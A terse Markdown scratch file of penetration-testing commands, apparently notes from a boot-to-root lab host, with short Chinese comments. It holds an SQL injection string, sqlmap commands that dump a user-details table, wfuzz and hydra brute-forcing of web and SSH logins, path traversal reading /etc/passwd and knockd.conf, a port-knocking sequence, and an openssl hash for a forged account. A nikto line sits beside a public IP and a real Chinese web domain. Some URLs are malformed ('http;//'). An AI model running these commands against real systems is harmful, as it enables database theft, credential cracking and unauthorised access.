# tmp

```
yum install openssl openssl-devel -y
nikto -host 10.0.17.100 # 61.151.167.89 mp.weixin.qq.com
' or 1=1 --+
sqlmap -u "http;//10.0.17.100/results.php" --data="swarch=1" 
# 查看当前链接的数据库
sqlmap -u "http;//10.0.17.100/results.php" --data="swarch=1" --current-db
# 查看所有的库
sqlmap -u "http;//10.0.17.100/results.php" --data="swarch=1" --dbs
# 那数据库表下的数据
sqlmap -u "http;//10.0.17.100/results.php" --data "search=1" -D users -T UserDetails --dump
# 密码爆破
wfuzz -z file,user-dict -z file,pass-dict "http;//10.0.17.100/manage.php?username=FUZZ&passwd=FUZ2Z"
# 过滤
wfuzz -z file,user-dict -z file,pass-dict --hw 87 "http;//10.0.17.100/manage.php?username=FUZZ&passwd=FUZ2Z"
# 指定cookie
wfuzz -b 'SESSID=aaaaaaaaaa' -w /usr/share/wfuzz/aaa.txt http://10.0.17.100/welcome.php?FUZZ=index.php
	file=../../../../../../../../etc/passwd
# 爆破ssh
hydra -L user-dict -P pass-dict 10.0.17.100 ssh
	# 端口敲门服务
	/etc/knockd.conf
	http://10.0.17.100/manage.php?../../../../../../../../../etc/knockd.conf
	nmap -p 7469 10.0.17.100
	nmap -p 8869 10.0.17.100
	nmap -p 7369 10.0.17.100
	nmap -p 22 10.0.17.100 # open
# inurl:p site:www.zhihu.com
find / -name "test.py"
openssl passwd -1 -salt admin 123456
				MD5 加盐 
47.98.188.62
```

